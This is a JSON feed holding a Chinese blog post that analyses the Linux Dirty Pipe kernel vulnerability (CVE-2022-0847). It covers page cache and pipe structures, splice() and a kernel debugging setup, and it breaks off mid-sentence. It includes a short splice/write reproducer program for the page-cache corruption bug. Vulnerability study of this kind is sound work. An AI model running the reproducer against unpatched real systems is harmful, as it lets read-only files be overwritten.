{
    "version": "https://jsonfeed.org/version/1",
    "title": "Squirre17 Blog • All posts by \"kernel\" tag",
    "description": "introvert",
    "home_page_url": "https://Squirre17.github.io",
    "items": [
        {
            "id": "https://squirre17.github.io/2022/11/02/CVE-2022-0847-DIRTY-PIPE-detail/",
            "url": "https://squirre17.github.io/2022/11/02/CVE-2022-0847-DIRTY-PIPE-detail/",
            "title": "CVE-2022-0847-DIRTY-PIPE-detail",
            "date_published": "2022-11-02T14:19:00.000Z",
            "content_html": "<h1 id=\"basic\"><a class=\"markdownIt-Anchor\" href=\"#basic\">#</a> basic</h1>\n<p>(之后会把 docker 做好传上去 以后就不用折腾了 QAQ)<br>\n<a href=\"https://hub.docker.com/repository/docker/squirre17/dirtypipe\">https://hub.docker.com/repository/docker/squirre17/dirtypipe</a></p>\n<h2 id=\"page-cache\"><a class=\"markdownIt-Anchor\" href=\"#page-cache\">#</a> page cache</h2>\n<p>Linux 的换页机制是脏页机制，也就是写一个文件是通过写内存缓存页，然后标记脏位，在换页的时候一次性写回磁盘。而不是每次都写磁盘。<br>\n在打开文件的时候可以用 <code>O_DIRECT | O_SYNC</code>  来标记对脏页进行直写策略，换回同步。<br>\n但这里并不是对文件进行硬存级别的篡改，假设文件进了内存，然后我修改了这个文件内存中的部分内容，短时间再次访问这个文件会直接从内存缓存中拿到我们篡改过的内容而不是去 disk 上取。</p>\n<h2 id=\"structs\"><a class=\"markdownIt-Anchor\" href=\"#structs\">#</a> structs</h2>\n<h3 id=\"file\"><a class=\"markdownIt-Anchor\" href=\"#file\">#</a> file</h3>\n<p><a href=\"https://elixir.bootlin.com/linux/v5.13-rc1/source/include/linux/fs.h#L920\">fs.h - include/linux/fs.h - Linux source code (v5.13-rc1) - Bootlin</a><br>\n 每一个打开的文件描述符和一个 struct 相对应</p>\n<ul>\n<li>pipe_inode_info 指向一个内核管道</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">file</span> &#123;</span></span><br><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">path</span>                  <span class=\"title\">f_path</span>;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">inode</span>                 *<span class=\"title\">f_inode</span>;</span></span><br><span class=\"line\">    <span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">file_operations</span> *<span class=\"title\">f_op</span>;</span></span><br><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">address_space</span>         *<span class=\"title\">f_mapping</span>;</span></span><br><span class=\"line\">...</span><br><span class=\"line\">\t <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_inode_info</span>    *<span class=\"title\">i_pipe</span>;</span></span><br><span class=\"line\">... </span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>其中的 address_space 指示了这个文件内容的映射位置</p>\n<h3 id=\"address_space\"><a class=\"markdownIt-Anchor\" href=\"#address_space\">#</a> address_space</h3>\n<p>address_space 的作用就是将文件在磁盘上的数据也<strong> page</strong> 的方式连续地呈现出来， 这样读取文件的操作便转换成了先将不连续的磁盘上的内容读取的 page 中， 再从连续的 page 中去读取连续的数据。</p>\n<ul>\n<li>i_pages: 缓存页组 (是一个 eXtend ARRAY)</li>\n<li>nrpages: 页表入口的大小</li>\n<li>a_ops: 记录着对这个文件进行操作的虚表方法 (glibc 打 io 或者内核打 ptmx 类似)</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">address_space</span> &#123;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">inode</span>        *<span class=\"title\">host</span>;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xarray</span>       <span class=\"title\">i_pages</span>;</span></span><br><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span>       nrpages;</span><br><span class=\"line\">    <span class=\"type\">pgoff_t</span>             writeback_index;</span><br><span class=\"line\">    <span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">address_space_operations</span> *<span class=\"title\">a_ops</span>;</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span>       flags;</span><br><span class=\"line\">...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"xarray\"><a class=\"markdownIt-Anchor\" href=\"#xarray\">#</a> xarray</h3>\n<p>xarray 指向了多个 page 结构体 也就是这个文件存放在哪几页。(这里是应该是以__rcu 为链表的形式 待验证)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">xarray</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"type\">spinlock_t</span>\txa_lock;</span><br><span class=\"line\"><span class=\"comment\">/* private: The rest of the data structure is not to be used directly. */</span></span><br><span class=\"line\">\t<span class=\"type\">gfp_t</span>\t\txa_flags;</span><br><span class=\"line\">\t<span class=\"type\">void</span> __rcu *\txa_head;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h3 id=\"pipe_inode_info\"><a class=\"markdownIt-Anchor\" href=\"#pipe_inode_info\">#</a> pipe_inode_info</h3>\n<p>在 file 里的内核管道</p>\n<ul>\n<li>head 指向生产者 buffer</li>\n<li>tail 指向消费者 buffer</li>\n<li>bufs 循环 buffer 的一个链表<br>\n这里的 ring 会被设置为 16 也就是有 16 个循环 buf 供 pipe 使用<br>\n然后 head 和 tail 是用于在 bufs 中做索引的<br>\n例如 <code>&amp;pipe-&gt;bufs[(head - 1) &amp; mask];</code>  这里的 mask 就是 ring-1.<br>\n 内核会为一个 pipe 分配 16 个 pipe_buffer，循环缓冲区</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_inode_info</span> &#123;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">mutex</span> <span class=\"title\">mutex</span>;</span></span><br><span class=\"line\">    <span class=\"type\">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> head;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> tail;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> max_usage;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">int</span> ring_size;</span><br><span class=\"line\"></span><br><span class=\"line\">\t (···)</span><br><span class=\"line\">\t </span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_buffer</span> *<span class=\"title\">bufs</span>;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">user_struct</span> *<span class=\"title\">user</span>;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">watch_queue</span> *<span class=\"title\">watch_queue</span>;</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2022/11/02/CVE-2022-0847-DIRTY-PIPE-detail/1.png\" alt><br>\n（图片来源 breeze 💐）</p>\n<h3 id=\"pipe_buffer\"><a class=\"markdownIt-Anchor\" href=\"#pipe_buffer\">#</a> pipe_buffer</h3>\n<p>每一个 buffer 指向一个 page</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_buffer</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">page</span> *<span class=\"title\">page</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> offset, len;</span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_buf_operations</span> *<span class=\"title\">ops</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> flags;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> private;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>page 结构体</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">page</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span> flags;</span><br><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"comment\">/* Page cache and anonymous pages */</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">address_space</span> *<span class=\"title\">mapping</span>;</span></span><br><span class=\"line\">    <span class=\"type\">pgoff_t</span> index;        <span class=\"comment\">/* Our offset within mapping. */</span></span><br><span class=\"line\">...</span><br><span class=\"line\">    <span class=\"type\">void</span> *virtual;    <span class=\"comment\">/* Kernel virtual address (NULL if</span></span><br><span class=\"line\"><span class=\"comment\">                       not kmapped, ie. highmem) */</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2022/11/02/CVE-2022-0847-DIRTY-PIPE-detail/2.png\" alt></p>\n<h3 id=\"inode\"><a class=\"markdownIt-Anchor\" href=\"#inode\">#</a> inode</h3>\n<p>在 file 的结构体中可以看到 每一个文件都有 inode (这是文件系统的管理方式)，对于管道，也有自己的 inode</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">struct</span> inode * <span class=\"title function_\">get_pipe_inode</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">inode</span> *<span class=\"title\">inode</span> =</span> new_inode_pseudo(pipe_mnt-&gt;mnt_sb);</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_inode_info</span> *<span class=\"title\">pipe</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!inode)</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> fail_inode;</span><br><span class=\"line\"></span><br><span class=\"line\">\tinode-&gt;i_ino = get_next_ino();</span><br><span class=\"line\"></span><br><span class=\"line\">\tpipe = alloc_pipe_info();</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!pipe)</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> fail_iput;</span><br><span class=\"line\"></span><br><span class=\"line\">\tinode-&gt;i_pipe = pipe;            <span class=\"comment\">// inode 指向一个 pipe</span></span><br><span class=\"line\">\tpipe-&gt;files = <span class=\"number\">2</span>;                 <span class=\"comment\">// number of struct file referring this pipe (protected by -&gt;i_lock)</span></span><br><span class=\"line\">\tpipe-&gt;readers = pipe-&gt;writers = <span class=\"number\">1</span>;</span><br><span class=\"line\">\tinode-&gt;i_fop = &amp;pipefifo_fops;</span><br><span class=\"line\"></span><br><span class=\"line\">\tinode-&gt;i_state = I_DIRTY;</span><br><span class=\"line\"></span><br><span class=\"line\">\t(···)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>关于 pipe 的创建</p>\n<ul>\n<li>申请了一个 pipe_inode_info 结构体</li>\n<li>申请了多个 buf，但是只返回一个指向这多个 buf 的头指针，相当于对一个长度的数组做头结点和尾结点都移动的链表 (数据结构学过的队列那块)</li>\n</ul>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">struct</span> pipe_inode_info *<span class=\"title function_\">alloc_pipe_info</span><span class=\"params\">(<span class=\"type\">void</span>)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_inode_info</span> *<span class=\"title\">pipe</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> pipe_bufs = PIPE_DEF_BUFFERS;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">user_struct</span> *<span class=\"title\">user</span> =</span> get_current_user();</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">long</span> user_bufs;</span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> max_size = READ_ONCE(pipe_max_size);</span><br><span class=\"line\"></span><br><span class=\"line\">\tpipe = kzalloc(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT);</span><br><span class=\"line\"></span><br><span class=\"line\">\t(···)</span><br><span class=\"line\"></span><br><span class=\"line\">\tpipe-&gt;bufs = kcalloc(pipe_bufs, <span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> pipe_buffer),</span><br><span class=\"line\">\t\t\t     GFP_KERNEL_ACCOUNT);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pipe-&gt;bufs) &#123;</span><br><span class=\"line\">\t\tinit_waitqueue_head(&amp;pipe-&gt;rd_wait);</span><br><span class=\"line\">\t\tinit_waitqueue_head(&amp;pipe-&gt;wr_wait);</span><br><span class=\"line\">\t\tpipe-&gt;r_counter = pipe-&gt;w_counter = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t\tpipe-&gt;max_usage = pipe_bufs;</span><br><span class=\"line\">\t\tpipe-&gt;ring_size = pipe_bufs;</span><br><span class=\"line\">\t\tpipe-&gt;nr_accounted = pipe_bufs;</span><br><span class=\"line\">\t\tpipe-&gt;user = user;</span><br><span class=\"line\">\t\tmutex_init(&amp;pipe-&gt;mutex);</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> pipe;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t(···)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"iov_iter\"><a class=\"markdownIt-Anchor\" href=\"#iov_iter\">#</a> iov_iter</h3>\n<p>iovec 接口用于处理用户传入的用户态缓存</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">iov_iter</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t * Bit 0 is the read/write bit, set if we&#x27;re writing.</span></span><br><span class=\"line\"><span class=\"comment\">\t * Bit 1 is the BVEC_FLAG_NO_REF bit, set if type is a bvec and</span></span><br><span class=\"line\"><span class=\"comment\">\t * the caller isn&#x27;t expecting to drop a page reference when done.</span></span><br><span class=\"line\"><span class=\"comment\">\t */</span></span><br><span class=\"line\">\t<span class=\"type\">unsigned</span> <span class=\"type\">int</span> type;</span><br><span class=\"line\">\t<span class=\"type\">size_t</span> iov_offset;</span><br><span class=\"line\">\t<span class=\"type\">size_t</span> count;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">union</span>&#123;</span></span><br><span class=\"line\">\t\t(···)</span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pipe_inode_info</span> *<span class=\"title\">pipe</span>;</span></span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\t(···)</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>在这里只用到了一个 pipe 对象 (也就是 pipe 对象由 iov_iter 进行管理或者说是更外一层的封装)。<br>\n在 PoC 中由 copy_page_to_iter_pipe 函数将用户输入的数据 (page) 写入 iov_iter 管理的 pipe 中</p>\n<h2 id=\"demo\"><a class=\"markdownIt-Anchor\" href=\"#demo\">#</a> demo</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;AAAAAAAAAA&quot; &gt; foo</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _GNU_SOURCE</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">    splice(<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    write(<span class=\"number\">1</span>, <span class=\"string\">&quot;BBBBB&quot;</span>, <span class=\"number\">5</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// ./splicer &lt;foo |cat &gt;/dev/null</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"environment\"><a class=\"markdownIt-Anchor\" href=\"#environment\">#</a> environment</h1>\n<h2 id=\"docker\"><a class=\"markdownIt-Anchor\" href=\"#docker\">#</a> docker</h2>\n<p>拉下 ubuntu20, 换个源先</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sed -i &quot;s/http:\\/\\/archive.ubuntu.com/http:\\/\\/mirrors.tuna.tsinghua.edu.cn/g&quot; /etc/apt/sources.list</span><br><span class=\"line\">apt-get update &amp;&amp; apt-get -y dist-upgrade</span><br></pre></td></tr></table></figure>\n<p>启动 docker 的时候千万要注意！！</p>\n<ul>\n<li>增加 SYS_PTRACE（打开调试）</li>\n<li>增加端口映射（这样才能让外部主机连上 gdb）</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -it --name=mdp1 --cap-add=SYS_PTRACE -p 1234:1234 my_dirty_pipe:1.0 /bin/bash</span><br></pre></td></tr></table></figure>\n<h2 id=\"other-tools\"><a class=\"markdownIt-Anchor\" href=\"#other-tools\">#</a> other tools</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">alias agi=&quot;/bin/apt-get install -y&quot;</span><br><span class=\"line\">agi vim gdb gdbserver wget make gcc flex bison bc git cpio ninja-build pkg-config automake libtool</span><br><span class=\"line\">agi libncurses-dev openssl libssl-dev dkms libelf-dev libudev-dev libpci-dev libiberty-dev autoconf libglib2.0-dev</span><br><span class=\"line\">agi libpixman-1-dev python</span><br></pre></td></tr></table></figure>\n<h2 id=\"qemu\"><a class=\"markdownIt-Anchor\" href=\"#qemu\">#</a> qemu</h2>\n<p>一个报错的解决文档 <a href=\"https://hackmd.io/@vqXkRUAvSzWmuGTirpUnMQ/rkVhfCa-r\">QEMU contribution - HackMD</a></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://download.qemu.org/qemu-6.2.0.tar.xz</span><br><span class=\"line\">mkdir build &amp;&amp; cd build  # 在下载目录新建文件夹build（这是必须的，因为configure命令必须在build文件夹下执行）</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">以下均在/build目录下</span></span><br><span class=\"line\">../configure</span><br><span class=\"line\">make  # 编译源码</span><br><span class=\"line\">make install  # 安装</span><br></pre></td></tr></table></figure>\n<p>这得老半天了</p>\n<h2 id=\"linux\"><a class=\"markdownIt-Anchor\" href=\"#linux\">#</a> Linux</h2>\n<p>选用 v5.13-rc1 版本</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https://github.com/torvalds/linux/archive/refs/tags/v5.13-rc1.tar.gz</span><br><span class=\"line\">make menuconfig </span><br><span class=\"line\">cat /proc/cpuinfo| grep &quot;cpu cores&quot; | uniq # check cpu core counts</span><br><span class=\"line\">make bzImage -j4</span><br></pre></td></tr></table></figure>\n<p>扣 y 选中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kernel hacking -&gt;compile-time checks and compiler opt -&gt; compile the kernel with debug info</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t-&gt; Provide GDB scripts for kernel debugging</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t-&gt; Generate readable assembler code               </span><br><span class=\"line\">kernel hacking -&gt; compile the kernel with frame pointers (没找到)</span><br><span class=\"line\">kernel hacking -&gt; Generic Kernel Debugging Instruments -&gt; KGDB: kernel debugger -&gt;</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tKGDB: use kgdb over the serial console (NEW)</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t\t\t\t\t</span><br></pre></td></tr></table></figure>\n<p>然后记得保证以下几个也打开了</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CONFIG_DEBUG_INFO_DWARF4=y</span><br></pre></td></tr></table></figure>\n<p>然后随便找个 ctf 的文件系统就行 或者 busybox 编译。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cpio -idmv &lt; ../rootfs.img #解包cpio</span><br><span class=\"line\">find . | cpio -o --format=newc &gt; ../rootfs.img #打包cpio</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">qemu-system-x86_64 \\</span><br><span class=\"line\">\t-m 256M \\</span><br><span class=\"line\">\t-kernel ./arch/x86/boot/bzImage \\</span><br><span class=\"line\">\t-initrd ./rootfs.img \\</span><br><span class=\"line\">\t-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot; \\</span><br><span class=\"line\">\t-cpu qemu64 \\</span><br><span class=\"line\">\t-nographic \\</span><br><span class=\"line\">\t-net nic,model=virtio \\</span><br><span class=\"line\">\t-net user \\</span><br><span class=\"line\">\t-s \\</span><br><span class=\"line\">\t-S</span><br></pre></td></tr></table></figure>\n<h1 id=\"静态分析\"><a class=\"markdownIt-Anchor\" href=\"#静态分析\">#</a> 静态分析</h1>\n<h4 id=\"splice函数\"><a class=\"markdownIt-Anchor\" href=\"#splice函数\">#</a> splice 函数</h4>\n<p>在两个 fd 中移动数据 为零拷贝操作<br>\n比如要实现 fp1 到 fp2 的数据拷贝 正常来说是要经历 <code>kernel space -&gt; user space -&gt; kernel space</code> <br>\n 用 splice 就可以变成 <code>fp1 -&gt; pipe_read -&gt; pipe_write -&gt; fp2</code></p>\n<p>将 fd_in 传递到文件描述符 fd_out，其中文件描述符之一必须引用管道。<br>\n <code>splice</code>  的零拷贝方法就是，直接用文件缓存页来替换 <code>pipe</code>  中的缓存页 (更改 pipe 缓存页指针指向文件缓存页)。<br>\n也就是实际上不需要经过把我们的输入拷贝到 pipe 这一步，直接把我们数据的缓存页的位置给到需要用到这个的 fd 就行了。（因为 pipe 就是一端写入一端读入，我如果把文件内容写入管道缓冲区，然后再从管道缓冲区写出，不如在管道缓冲区的时候直接让 buffer 的 page 